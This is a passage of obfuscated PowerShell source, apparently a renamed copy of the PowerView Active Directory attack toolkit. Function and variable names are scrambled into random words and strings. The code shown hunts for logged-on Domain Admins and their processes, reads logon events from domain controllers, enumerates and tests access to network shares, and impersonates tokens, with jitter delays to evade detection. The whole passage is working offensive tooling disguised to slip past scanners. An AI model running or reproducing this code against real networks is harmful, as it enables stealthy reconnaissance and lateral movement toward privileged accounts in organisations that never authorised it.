                                    $KmhpOqzu99 | Add-Member NoteProperty 'SessionFromName' $OBrABBhI99
                                }
                                catch {
                                    $KmhpOqzu99 | Add-Member NoteProperty 'SessionFromName' $Null
                                }

                                if ($eZZeCTaU99) {
                                    $Admin = (appreciates -ComputerName $CName).IsAdmin
                                    $KmhpOqzu99 | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                }
                                else {
                                    $KmhpOqzu99 | Add-Member Noteproperty 'LocalAdmin' $Null
                                }
                                $KmhpOqzu99.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                $KmhpOqzu99
                            }
                        }
                    }
                    if (-not $gGpvysda99) {
                        $vmVaJJUj99 = pawnshops -ComputerName $KoSdeYaT99
                        ForEach ($User in $vmVaJJUj99) {
                            $OvZZajfU99 = $User.UserName
                            $thGIxDFy99 = $User.LogonDomain

                            if (($OvZZajfU99) -and ($OvZZajfU99.trim() -ne '')) {
                                if ( (-not $wlXzrlmQ99) -or ($wlXzrlmQ99 -contains $OvZZajfU99) -and ($OvZZajfU99 -notmatch '\$$')) {
                                    $raAkILNI99 = @(bootstrap -ComputerName $KoSdeYaT99)[0].IPAddress
                                    $KmhpOqzu99 = New-Object PSObject
                                    $KmhpOqzu99 | Add-Member Noteproperty 'UserDomain' $thGIxDFy99
                                    $KmhpOqzu99 | Add-Member Noteproperty 'UserName' $OvZZajfU99
                                    $KmhpOqzu99 | Add-Member Noteproperty 'ComputerName' $KoSdeYaT99
                                    $KmhpOqzu99 | Add-Member Noteproperty 'IPAddress' $raAkILNI99
                                    $KmhpOqzu99 | Add-Member Noteproperty 'SessionFrom' $Null
                                    $KmhpOqzu99 | Add-Member Noteproperty 'SessionFromName' $Null

                                    if ($eZZeCTaU99) {
                                        $Admin = appreciates -ComputerName $KoSdeYaT99
                                        $KmhpOqzu99 | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                    }
                                    else {
                                        $KmhpOqzu99 | Add-Member Noteproperty 'LocalAdmin' $Null
                                    }
                                    $KmhpOqzu99.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                    $KmhpOqzu99
                                }
                            }
                        }
                    }
                }
            }

            if ($ZDPszabE99) {
                potato
            }
        }

        $KqozIDmd99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $KqozIDmd99 = privets -Credential $tYWiEqAT99
            }
            else {
                $KqozIDmd99 = privets -Credential $tYWiEqAT99 -Quiet
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[residential] Total number of hosts: $($ZCKwKoiv99.count)"
            Write-Verbose "[residential] Delay: $Delay, Jitter: $gIOVyqMv99"
            $ivWhKcbY99 = 0
            $fyuRWnJS99 = New-Object System.Random

            ForEach ($KoSdeYaT99 in $ZCKwKoiv99) {
                $ivWhKcbY99 = $ivWhKcbY99 + 1

                Start-Sleep -Seconds $fyuRWnJS99.Next((1-$gIOVyqMv99)*$Delay, (1+$gIOVyqMv99)*$Delay)

                Write-Verbose "[residential] Enumerating server $BoJggNks99 ($ivWhKcbY99 of $($ZCKwKoiv99.Count))"
                Invoke-Command -ScriptBlock $BJtVKDHD99 -ArgumentList $KoSdeYaT99, $wlXzrlmQ99, $NSfWjkcR99, $gGpvysda99, $KqozIDmd99

                if ($uBmcbTpF99 -and $TSkCgmBs99) {
                    Write-Verbose "[residential] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[residential] Using threading with threads: $HTdoixhx99"
            Write-Verbose "[residential] TargetComputers length: $($ZCKwKoiv99.Length)"

            $BHxnrcDI99 = @{
                'TargetUsers' = $wlXzrlmQ99
                'CurrentUser' = $NSfWjkcR99
                'Stealth' = $gGpvysda99
                'TokenHandle' = $KqozIDmd99
            }

            nighttime -ComputerName $ZCKwKoiv99 -ScriptBlock $BJtVKDHD99 -ScriptParameters $BHxnrcDI99 -Threads $HTdoixhx99
        }
    }

    END {
        if ($KqozIDmd99) {
            potato -TokenHandle $KqozIDmd99
        }
    }
}


function allaying {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $tdrFALUN99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [String]
        $PoXGVGfN99,

        [ValidateNotNullOrEmpty()]
        [String]
        $oGyOVIvJ99,

        [ValidateNotNullOrEmpty()]
        [String]
        $ocbESvDy99,

        [Alias('Unconstrained')]
        [Switch]
        $eZtvAJPm99,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ZusWAspj99,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $WXClDdmq99,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $PsJJAxFX99,

        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $FERQgOkV99,

        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $CgAKgSWG99,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $thGIxDFy99,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $nSeBUOKk99,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $NZDWwSev99,

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $ZIIeJpKb99 = 'Domain Admins',

        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        $hXfOdLeR99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $TSkCgmBs99,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $gIOVyqMv99 = .3,

        [Int]
        [ValidateRange(1, 100)]
        $HTdoixhx99 = 20
    )

    BEGIN {
        $BNZinIaQ99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $BNZinIaQ99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['ComputerDomain']) { $BNZinIaQ99['Domain'] = $PoXGVGfN99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $BNZinIaQ99['LDAPFilter'] = $oGyOVIvJ99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $BNZinIaQ99['SearchBase'] = $ocbESvDy99 }
        if ($PSBoundParameters['Unconstrained']) { $BNZinIaQ99['Unconstrained'] = $eWrtIVpV99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $BNZinIaQ99['OperatingSystem'] = $kOjIFfIK99 }
        if ($PSBoundParameters['ComputerServicePack']) { $BNZinIaQ99['ServicePack'] = $iZbiKaWr99 }
        if ($PSBoundParameters['ComputerSiteName']) { $BNZinIaQ99['SiteName'] = $UHxOuyqA99 }
        if ($PSBoundParameters['Server']) { $BNZinIaQ99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $BNZinIaQ99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $BNZinIaQ99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $BNZinIaQ99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $BNZinIaQ99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $BNZinIaQ99['Credential'] = $tYWiEqAT99 }

        $HYrlZdwg99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $HYrlZdwg99['Identity'] = $CgAKgSWG99 }
        if ($PSBoundParameters['Domain']) { $HYrlZdwg99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['UserDomain']) { $HYrlZdwg99['Domain'] = $thGIxDFy99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $HYrlZdwg99['LDAPFilter'] = $nSeBUOKk99 }
        if ($PSBoundParameters['UserSearchBase']) { $HYrlZdwg99['SearchBase'] = $NZDWwSev99 }
        if ($PSBoundParameters['UserAdminCount']) { $HYrlZdwg99['AdminCount'] = $hXfOdLeR99 }
        if ($PSBoundParameters['Server']) { $HYrlZdwg99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $HYrlZdwg99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $HYrlZdwg99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $HYrlZdwg99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $HYrlZdwg99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $HYrlZdwg99['Credential'] = $tYWiEqAT99 }


        if ($PSBoundParameters['ComputerName']) {
            $ZCKwKoiv99 = $tdrFALUN99
        }
        else {
            Write-Verbose '[allaying] Querying computers in the domain'
            $ZCKwKoiv99 = undergrad @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[allaying] TargetComputers length: $($ZCKwKoiv99.Length)"
        if ($ZCKwKoiv99.Length -eq 0) {
            throw '[allaying] No hosts found to enumerate'
        }

        if ($PSBoundParameters['ProcessName']) {
            $tRJihenz99 = @()
            ForEach ($T in $FERQgOkV99) {
                $tRJihenz99 += $T.Split(',')
            }
            if ($tRJihenz99 -isnot [System.Array]) {
                $tRJihenz99 = [String[]] @($tRJihenz99)
            }
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $wlXzrlmQ99 = asseverate @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $fruBZLAG99 = @{
                'Identity' = $ZIIeJpKb99
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $fruBZLAG99['Domain'] = $thGIxDFy99 }
            if ($PSBoundParameters['UserSearchBase']) { $fruBZLAG99['SearchBase'] = $NZDWwSev99 }
            if ($PSBoundParameters['Server']) { $fruBZLAG99['Server'] = $tqOJuvTN99 }
            if ($PSBoundParameters['SearchScope']) { $fruBZLAG99['SearchScope'] = $lGlQEcNF99 }
            if ($PSBoundParameters['ResultPageSize']) { $fruBZLAG99['ResultPageSize'] = $ixOvvLXO99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $fruBZLAG99['ServerTimeLimit'] = $EQlXfKFO99 }
            if ($PSBoundParameters['Tombstone']) { $fruBZLAG99['Tombstone'] = $adpABMuf99 }
            if ($PSBoundParameters['Credential']) { $fruBZLAG99['Credential'] = $tYWiEqAT99 }
            $fruBZLAG99
            $wlXzrlmQ99 = deleted @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        $BJtVKDHD99 = {
            Param($tdrFALUN99, $FERQgOkV99, $wlXzrlmQ99, $tYWiEqAT99)

            ForEach ($KoSdeYaT99 in $tdrFALUN99) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $KoSdeYaT99
                if ($Up) {
                    if ($tYWiEqAT99) {
                        $DrTtmgcw99 = intake -Credential $tYWiEqAT99 -ComputerName $KoSdeYaT99 -ErrorAction SilentlyContinue
                    }
                    else {
                        $DrTtmgcw99 = intake -ComputerName $KoSdeYaT99 -ErrorAction SilentlyContinue
                    }
                    ForEach ($DYlYhKHG99 in $DrTtmgcw99) {
                        if ($FERQgOkV99) {
                            if ($FERQgOkV99 -Contains $DYlYhKHG99.ProcessName) {
                                $DYlYhKHG99
                            }
                        }
                        elseif ($wlXzrlmQ99 -Contains $DYlYhKHG99.User) {
                            $DYlYhKHG99
                        }
                    }
                }
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[allaying] Total number of hosts: $($ZCKwKoiv99.count)"
            Write-Verbose "[allaying] Delay: $Delay, Jitter: $gIOVyqMv99"
            $ivWhKcbY99 = 0
            $fyuRWnJS99 = New-Object System.Random

            ForEach ($KoSdeYaT99 in $ZCKwKoiv99) {
                $ivWhKcbY99 = $ivWhKcbY99 + 1

                Start-Sleep -Seconds $fyuRWnJS99.Next((1-$gIOVyqMv99)*$Delay, (1+$gIOVyqMv99)*$Delay)

                Write-Verbose "[allaying] Enumerating server $KoSdeYaT99 ($ivWhKcbY99 of $($ZCKwKoiv99.count))"
                $uBmcbTpF99 = Invoke-Command -ScriptBlock $BJtVKDHD99 -ArgumentList $KoSdeYaT99, $tRJihenz99, $wlXzrlmQ99, $tYWiEqAT99
                $uBmcbTpF99

                if ($uBmcbTpF99 -and $TSkCgmBs99) {
                    Write-Verbose "[allaying] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[allaying] Using threading with threads: $HTdoixhx99"

            $BHxnrcDI99 = @{
                'ProcessName' = $tRJihenz99
                'TargetUsers' = $wlXzrlmQ99
                'Credential' = $tYWiEqAT99
            }

            nighttime -ComputerName $ZCKwKoiv99 -ScriptBlock $BJtVKDHD99 -ScriptParameters $BHxnrcDI99 -Threads $HTdoixhx99
        }
    }
}


function unlimited {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tdrFALUN99,

        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $HLDsNhab99,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $KOQHhTKJ99 = [DateTime]::Now.AddDays(-1),

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $EqqTrDhS99 = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $WZeonQKA99 = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $CgAKgSWG99,

        [ValidateNotNullOrEmpty()]
        [String]
        $thGIxDFy99,

        [ValidateNotNullOrEmpty()]
        [String]
        $nSeBUOKk99,

        [ValidateNotNullOrEmpty()]
        [String]
        $NZDWwSev99,

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $ZIIeJpKb99 = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        $hXfOdLeR99,

        [Switch]
        $eZZeCTaU99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $TSkCgmBs99,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $gIOVyqMv99 = .3,

        [Int]
        [ValidateRange(1, 100)]
        $HTdoixhx99 = 20
    )

    BEGIN {
        $HYrlZdwg99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $HYrlZdwg99['Identity'] = $CgAKgSWG99 }
        if ($PSBoundParameters['UserDomain']) { $HYrlZdwg99['Domain'] = $thGIxDFy99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $HYrlZdwg99['LDAPFilter'] = $nSeBUOKk99 }
        if ($PSBoundParameters['UserSearchBase']) { $HYrlZdwg99['SearchBase'] = $NZDWwSev99 }
        if ($PSBoundParameters['UserAdminCount']) { $HYrlZdwg99['AdminCount'] = $hXfOdLeR99 }
        if ($PSBoundParameters['Server']) { $HYrlZdwg99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $HYrlZdwg99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $HYrlZdwg99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $HYrlZdwg99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $HYrlZdwg99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $HYrlZdwg99['Credential'] = $tYWiEqAT99 }

        if ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount']) {
            $wlXzrlmQ99 = asseverate @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters['UserGroupIdentity'] -or (-not $PSBoundParameters['Filter'])) {
            $fruBZLAG99 = @{
                'Identity' = $ZIIeJpKb99
                'Recurse' = $True
            }
            Write-Verbose "UserGroupIdentity: $ZIIeJpKb99"
            if ($PSBoundParameters['UserDomain']) { $fruBZLAG99['Domain'] = $thGIxDFy99 }
            if ($PSBoundParameters['UserSearchBase']) { $fruBZLAG99['SearchBase'] = $NZDWwSev99 }
            if ($PSBoundParameters['Server']) { $fruBZLAG99['Server'] = $tqOJuvTN99 }
            if ($PSBoundParameters['SearchScope']) { $fruBZLAG99['SearchScope'] = $lGlQEcNF99 }
            if ($PSBoundParameters['ResultPageSize']) { $fruBZLAG99['ResultPageSize'] = $ixOvvLXO99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $fruBZLAG99['ServerTimeLimit'] = $EQlXfKFO99 }
            if ($PSBoundParameters['Tombstone']) { $fruBZLAG99['Tombstone'] = $adpABMuf99 }
            if ($PSBoundParameters['Credential']) { $fruBZLAG99['Credential'] = $tYWiEqAT99 }
            $wlXzrlmQ99 = deleted @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        if ($PSBoundParameters['ComputerName']) {
            $ZCKwKoiv99 = $tdrFALUN99
        }
        else {
            $cNKzIqTH99 = @{
                'LDAP' = $True
            }
            if ($PSBoundParameters['Domain']) { $cNKzIqTH99['Domain'] = $JXWXuoyG99 }
            if ($PSBoundParameters['Server']) { $cNKzIqTH99['Server'] = $tqOJuvTN99 }
            if ($PSBoundParameters['Credential']) { $cNKzIqTH99['Credential'] = $tYWiEqAT99 }
            Write-Verbose "[unlimited] Querying for domain controllers in domain: $JXWXuoyG99"
            $ZCKwKoiv99 = militarist @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        if ($ZCKwKoiv99 -and ($ZCKwKoiv99 -isnot [System.Array])) {
            $ZCKwKoiv99 = @(,$ZCKwKoiv99)
        }
        Write-Verbose "[unlimited] TargetComputers length: $($ZCKwKoiv99.Length)"
        Write-Verbose "[unlimited] TargetComputers $ZCKwKoiv99"
        if ($ZCKwKoiv99.Length -eq 0) {
            throw '[unlimited] No hosts found to enumerate'
        }

        $BJtVKDHD99 = {
            Param($tdrFALUN99, $KOQHhTKJ99, $EqqTrDhS99, $WZeonQKA99, $wlXzrlmQ99, $HLDsNhab99, $tYWiEqAT99)

            ForEach ($KoSdeYaT99 in $tdrFALUN99) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $KoSdeYaT99
                if ($Up) {
                    $NFLiCKwI99 = @{
                        'ComputerName' = $KoSdeYaT99
                    }
                    if ($KOQHhTKJ99) { $NFLiCKwI99['StartTime'] = $KOQHhTKJ99 }
                    if ($EqqTrDhS99) { $NFLiCKwI99['EndTime'] = $EqqTrDhS99 }
                    if ($WZeonQKA99) { $NFLiCKwI99['MaxEvents'] = $WZeonQKA99 }
                    if ($tYWiEqAT99) { $NFLiCKwI99['Credential'] = $tYWiEqAT99 }
                    if ($HLDsNhab99 -or $wlXzrlmQ99) {
                        if ($wlXzrlmQ99) {
                            Ludhiana @DomainUserEventArgs | Where-Object {$wlXzrlmQ99 -contains $_.TargetUserName}
                        }
                        else {
                            $whxZgmpm99 = 'or'
                            $HLDsNhab99.Keys | ForEach-Object {
                                if (($_ -eq 'Op') -or ($_ -eq 'Operator') -or ($_ -eq 'Operation')) {
                                    if (($HLDsNhab99[$_] -match '&') -or ($HLDsNhab99[$_] -eq 'and')) {
                                        $whxZgmpm99 = 'and'
                                    }
                                }
                            }
                            $Keys = $HLDsNhab99.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne 'Operator') -and ($_ -ne 'Operation')}
                            Ludhiana @DomainUserEventArgs | ForEach-Object {
                                if ($whxZgmpm99 -eq 'or') {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -match $HLDsNhab99[$Key]) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -notmatch $HLDsNhab99[$Key]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        Ludhiana @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[unlimited] Total number of hosts: $($ZCKwKoiv99.count)"
            Write-Verbose "[unlimited] Delay: $Delay, Jitter: $gIOVyqMv99"
            $ivWhKcbY99 = 0
            $fyuRWnJS99 = New-Object System.Random

            ForEach ($KoSdeYaT99 in $ZCKwKoiv99) {
                $ivWhKcbY99 = $ivWhKcbY99 + 1

                Start-Sleep -Seconds $fyuRWnJS99.Next((1-$gIOVyqMv99)*$Delay, (1+$gIOVyqMv99)*$Delay)

                Write-Verbose "[unlimited] Enumerating server $KoSdeYaT99 ($ivWhKcbY99 of $($ZCKwKoiv99.count))"
                $uBmcbTpF99 = Invoke-Command -ScriptBlock $BJtVKDHD99 -ArgumentList $KoSdeYaT99, $KOQHhTKJ99, $EqqTrDhS99, $WZeonQKA99, $wlXzrlmQ99, $HLDsNhab99, $tYWiEqAT99
                $uBmcbTpF99

                if ($uBmcbTpF99 -and $TSkCgmBs99) {
                    Write-Verbose "[unlimited] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[unlimited] Using threading with threads: $HTdoixhx99"

            $BHxnrcDI99 = @{
                'StartTime' = $KOQHhTKJ99
                'EndTime' = $EqqTrDhS99
                'MaxEvents' = $WZeonQKA99
                'TargetUsers' = $wlXzrlmQ99
                'Filter' = $HLDsNhab99
                'Credential' = $tYWiEqAT99
            }

            nighttime -ComputerName $ZCKwKoiv99 -ScriptBlock $BJtVKDHD99 -ScriptParameters $BHxnrcDI99 -Threads $HTdoixhx99
        }
    }
}


function hasty {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $tdrFALUN99,

        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $PoXGVGfN99,

        [ValidateNotNullOrEmpty()]
        [String]
        $oGyOVIvJ99,

        [ValidateNotNullOrEmpty()]
        [String]
        $ocbESvDy99,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ZusWAspj99,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $WXClDdmq99,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $PsJJAxFX99,

        [Alias('CheckAccess')]
        [Switch]
        $kFEwNZHv99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $gIOVyqMv99 = .3,

        [Int]
        [ValidateRange(1, 100)]
        $HTdoixhx99 = 20
    )

    BEGIN {

        $BNZinIaQ99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $BNZinIaQ99['Domain'] = $PoXGVGfN99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $BNZinIaQ99['LDAPFilter'] = $oGyOVIvJ99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $BNZinIaQ99['SearchBase'] = $ocbESvDy99 }
        if ($PSBoundParameters['Unconstrained']) { $BNZinIaQ99['Unconstrained'] = $eWrtIVpV99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $BNZinIaQ99['OperatingSystem'] = $kOjIFfIK99 }
        if ($PSBoundParameters['ComputerServicePack']) { $BNZinIaQ99['ServicePack'] = $iZbiKaWr99 }
        if ($PSBoundParameters['ComputerSiteName']) { $BNZinIaQ99['SiteName'] = $UHxOuyqA99 }
        if ($PSBoundParameters['Server']) { $BNZinIaQ99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $BNZinIaQ99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $BNZinIaQ99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $BNZinIaQ99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $BNZinIaQ99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $BNZinIaQ99['Credential'] = $tYWiEqAT99 }

        if ($PSBoundParameters['ComputerName']) {
            $ZCKwKoiv99 = $tdrFALUN99
        }
        else {
            Write-Verbose '[hasty] Querying computers in the domain'
            $ZCKwKoiv99 = undergrad @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[hasty] TargetComputers length: $($ZCKwKoiv99.Length)"
        if ($ZCKwKoiv99.Length -eq 0) {
            throw '[hasty] No hosts found to enumerate'
        }

        $BJtVKDHD99 = {
            Param($tdrFALUN99, $kFEwNZHv99, $ZDPszabE99)

            if ($ZDPszabE99) {
                $Null = privets -TokenHandle $ZDPszabE99 -Quiet
            }

            ForEach ($KoSdeYaT99 in $tdrFALUN99) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $KoSdeYaT99
                if ($Up) {
                    $YFAdJOnK99 = publication -ComputerName $KoSdeYaT99
                    ForEach ($Share in $YFAdJOnK99) {
                        $XZVBpgKL99 = $Share.Name
                        $Path = '\\'+$KoSdeYaT99+'\'+$XZVBpgKL99

                        if (($XZVBpgKL99) -and ($XZVBpgKL99.trim() -ne '')) {
                            if ($kFEwNZHv99) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $Share
                                }
                                catch {
                                    Write-Verbose "Error accessing share path $Path : $_"
                                }
                            }
                            else {
                                $Share
                            }
                        }
                    }
                }
            }

            if ($ZDPszabE99) {
                potato
            }
        }

        $KqozIDmd99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $KqozIDmd99 = privets -Credential $tYWiEqAT99
            }
            else {
                $KqozIDmd99 = privets -Credential $tYWiEqAT99 -Quiet
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[hasty] Total number of hosts: $($ZCKwKoiv99.count)"
            Write-Verbose "[hasty] Delay: $Delay, Jitter: $gIOVyqMv99"
